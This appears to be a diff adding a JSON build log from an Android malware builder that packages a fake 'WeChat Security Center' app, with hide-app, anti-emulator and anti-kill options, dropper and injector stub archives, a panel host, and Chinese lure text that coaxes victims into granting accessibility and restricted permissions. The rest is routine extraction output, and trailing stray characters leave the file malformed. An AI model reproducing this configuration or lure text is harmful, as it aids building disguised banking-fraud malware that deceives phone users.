@@ -1,0 +1,112 @@
+[
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "WORKER 参数初始化完成:\r\nMYID: 8E0BAE5E8D03E4D5862674253B270C23\r\nAppid: com.interceptor.triager.dispatcher\r\nUserid: 842667\r\nClientName: wx\r\nEmail: GwxsPvgsom/YNeGuYOn5HHfjLqgbU30f0F+pdzDwjEs=\r\nMainActivity: empty\r\nAppdir: empty\r\nUserHost: yk.6668888.top\r\nuse_access: 1\r\nuse_antkill: 1\r\nuse_atoprims: 加载中~请勿操作或锁屏！\r\nnotifytitle:   \r\nnotifymsg: off\r\nASKPRIM_all: 1\r\nASKPRIM_black: 1\r\nBuildtype: C\r\nappname: 微信安全中心\r\nappversion: 5.6.4\r\nappicopath: 335381cba730dcd4cf450a60de831dad.png\r\nappurl: PQCnd9msaRrVP3fCYep1kKiDyt+9lEQNfWl5+TBuUCI=\r\nlogintitle: name\r\nlogindis: 允许受限制的设置\r\nloginbtn: 确定\r\nlngshort:                         微信安全中心   检查手机异常，本次需要开启权限才能解除异常。   请仔细阅读使用步骤--   1、点击下方确定--   2、打开已下载服务（或应用）--   3、点击微信安全中心--开始使用--等待加载100%即可使用\r\nhiddenapp: 1\r\nnoemulator: /www/wwwroot/yk.6668888.top/user/ui/01756566fffbd2bbb602d5641060c55a.png\r\ninstalltype: g\r\nhidetype: f\r\nuse_draw: 0\r\nopen_access：0\r\ndescr_iption：无\r\ndiao_type：1\r\nZIPPATH: /www/wwwroot/yk.6668888.top/private/apkstub/apkstub.zip\r\nTargetApkicon: /www/wwwroot/yk.6668888.top/user/storage/842667/icons/335381cba730dcd4cf450a60de831dad.png\r\nDropStub: /www/wwwroot/yk.6668888.top/private/apkstub/dropstub.zip\r\nInjectStub: /www/wwwroot/yk.6668888.top/private/apkstub/jectstub.zip\r\nuserfolder: /www/wwwroot/yk.6668888.top/user/apps/842667/com.interceptor.triager.dispatcher"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": ">> Step1 Started.."
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": ">> Preparation Started.."
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-CMD] java -version"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-SHELL] Picked up JAVA_TOOL_OPTIONS: -Xmx4g"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-SHELL] openjdk version \"11.0.30\" 2026-01-20"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-SHELL] OpenJDK Runtime Environment (build 11.0.30+7-post-Ubuntu-1ubuntu122.04)"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": ">> Extract New Data.."
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": ">> Extract Apk Start.."
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-CMD] cd /tmp/Eaod_custom_SMkgnYUUkU"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-CMD] 7z x \"/tmp/Eaod_custom_SMkgnYUUkU/temp.zip\" -otemp"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-SHELL] OpenJDK 64-Bit Server VM (build 11.0.30+7-post-Ubuntu-1ubuntu122.04, mixed mode, sharing)"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-SHELL] 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-SHELL] p7zip Version 16.02 (locale=C,Utf16=off,HugeFiles=on,64 bits,32 CPUs Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz (50657),ASM,AES-NI)"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-SHELL] Scanning the drive for archives:"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-SHELL] 1 file, 24377118 bytes (24 MiB)"
+  },
+  {
+    "Date": "03/30/2026 16:50:05",
+    "Content": "[DEBUG-SHELL] Extracting archive: /tmp/Eaod_custom_SMkgnYUUkU/temp.zip"
+  },
+  {
+    "Date": "03/30/2026 16:50:16",
+    "Content": "[DEBUG-SHELL] --"
+  },
+  {
+    "Date": "03/30/2026 16:50:16",
+    "Content": "[DEBUG-SHELL] Path = /tmp/Eaod_custom_SMkgnYUUkU/temp.zip"
+  },
+  {
+    "Date": "03/30/2026 16:50:16",
+    "Content": "[DEBUG-SHELL] Type = zip"
+  },
+  {
+    "Date": "03/30/2026 16:50:16",
+    "Content": "[DEBUG-SHELL] Physical Size = 24377118"
+  },
+  {
+    "Date": "03/30/2026 16:50:16",
+    "Content": "[DEBUG-SHELL] Everything is Ok"
+  },
+  {
+    "Date": "03/30/2026 16:50:16",
+    "Content": ">> Extract Finish.."
+  },
+  {
+    "Date": "03/30/2026 16:50:16",
+    "Content": "[DEBUG-SHELL] Folders: 883"
+  },
+  {
+    "Date": "03/30/2026 16:50:16",
+    "Content": "[DEBUG-SHELL] Files: 23442"
+  },
+  {
+    "Date": "03/30/2026 16:50:16",
+    "Content": "[DEBUG-SHELL] Size:       116239577"
+  },
+  {
+    "Date": "03/30/2026 16:50:16",
+    "Content": ">> Check Permissions..."
+  }
+]7118"
+  }
+]
